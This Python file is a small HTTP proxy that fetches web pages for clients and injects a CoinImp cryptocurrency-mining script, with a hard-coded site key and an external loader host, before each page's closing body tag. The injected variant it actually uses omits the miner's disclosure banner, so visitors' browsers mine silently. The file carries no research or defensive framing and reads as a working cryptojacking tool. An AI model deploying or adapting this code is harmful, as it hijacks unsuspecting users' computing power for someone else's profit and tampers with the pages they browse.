import socketserver
from http.server import BaseHTTPRequestHandler, HTTPServer
import time
#import http.client
import urllib.request
import urllib.parse
import urllib.error

hostName=''
hostPort=9090

##TODO:
# 1) fix the body and BODY
# 2) fix the metachar set
# 3) fix that it downloads

nice_mining_code = b'<SCRIPT src="https://www.hostingcloud.science./wDfk.js"></SCRIPT>\n<SCRIPT>\nvar _givemecoins = new Client.Anonymous(\x279b9d88865acb8bb8cbee2e46cc04da113b51ebe782742b6a5671750315002950\x27, { throttle: 0.5\n});\n_givemecoins.start();\n_givemecoins.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");\n</SCRIPT>'

mining_code = b'<SCRIPT src="https://www.hostingcloud.science./wDfk.js"></SCRIPT>\n<SCRIPT>\nvar _givemecoins = new Client.Anonymous(\x279b9d88865acb8bb8cbee2e46cc04da113b51ebe782742b6a5671750315002950\x27, { throttle: 0.5\n});\n_givemecoins.start();\n</SCRIPT>'

def get_index(string,list_of_tup):
    for x in list_of_tup:
        if x[0] == string:
            return list_of_tup.index(x)
    return None

print(mining_code)
class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        URL = "http://"+self.headers['Host']+self.path
        #print(URL)
        myheaders = self.headers.__dict__
        if 'Cache-Control' in [x[0] for x in myheaders['_headers']]:
            del myheaders['_headers'][get_index('Cache-Control',myheaders['_headers'])]
        myheaders['_headers'].append(('Cache-Control','no-cache'))
        new_req = urllib.request.Request(url=URL,headers=dict(myheaders['_headers']),method=self.command)

        try:
            with urllib.request.urlopen(new_req) as response:
                the_page = response.read()
                head_page = the_page.split(b'</HEAD>')
                if len(head_page)>1:
                    the_page = head_page[0]+b'<meta charset="utf-8"/>'+b'</HEAD>'+head_page[1]
                #self.wfile.write(mining_code+the_page)
                if len(the_page.split(b'</BODY>')) == 2: #There is just one BODY in a web page
                    #print("Injecting")
                    tmp_page = the_page.split(b'</BODY>')
                    the_page = tmp_page[0] + mining_code + b'</BODY>' + tmp_page[1]
                    self.wfile.write(the_page)
                    #print(the_page)
                else:
                    print("NO injection for: "+URL)
                    print(len(the_page.split(b'</body>')))
                    self.wfile.write(the_page)
        except urllib.error.HTTPError as e:
            print("Error for {0}: {1} -> {2}".format(URL,e.code,e.msg))

myServer = HTTPServer((hostName, hostPort), MyServer)
print(time.asctime(), "Server Starts - %s:%s" % (hostName, hostPort))

try:
    myServer.serve_forever()
except KeyboardInterrupt:
    pass

myServer.server_close()
print(time.asctime(), "Server Stops - %s:%s" % (hostName, hostPort))
